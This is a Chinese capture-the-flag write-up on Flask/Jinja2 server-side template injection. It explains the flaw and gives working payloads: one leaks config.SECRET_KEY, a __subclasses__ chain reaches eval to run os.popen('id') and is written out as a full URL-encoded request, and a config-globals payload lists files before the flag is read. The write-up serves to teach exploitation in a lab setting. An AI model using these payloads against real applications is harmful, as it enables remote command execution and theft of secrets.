# 题目描述
打开直接看源码
![image](https://user-images.githubusercontent.com/24989246/173508561-716d04f7-d0a2-4ce6-bb35-4dc7f317f0fc.png)
# 解题思路
这里了解了一下什么是模板注入
这里针对的是flask模板，config是flask模板中的一个全局对象。包含了所有应用程序的配置值。
注释中有提示是SECRET_KEY
这里直接在url中写上?flag={{config.SECRET_KEY}}
![image](https://user-images.githubusercontent.com/24989246/173509161-edfbc314-00d6-4ea9-8476-5e1db4a44cee.png)
# 模板注入总结
## 1、什么是SSTI？

SSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。

可能SSTI对大家而言不是很熟悉，但是相信大家很熟悉SQL注入。实际上这两者的思路都是相同的，因此可以类比来分析。

## 2、引发SSTI的真正原因

render_template渲染函数的问题

渲染函数在渲染的时候，往往对用户输入的变量不做渲染。

也就是说例如：{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞

## 3、判断类型
![image](https://user-images.githubusercontent.com/24989246/173509402-624cc9f7-36f5-4e23-9e54-d6e8e5358196.png)

# 常见的模板注入利用方式
## 1、官方的漏洞利用方法：
```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```
 把上面这一串当做name参数传递即可实现命令执行：
```shell
 http://192.168.1.10:8000/?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20}}%20{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}
```

2.传入参数
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}查看文件列表
![image](https://user-images.githubusercontent.com/24989246/179968951-d2fd0317-cedf-442c-b687-2a3bb2829d90.png)

再cat 一下
![image](https://user-images.githubusercontent.com/24989246/179969046-f6556bc1-1a78-40a4-8818-aa4d63d371b2.png)

得到flag

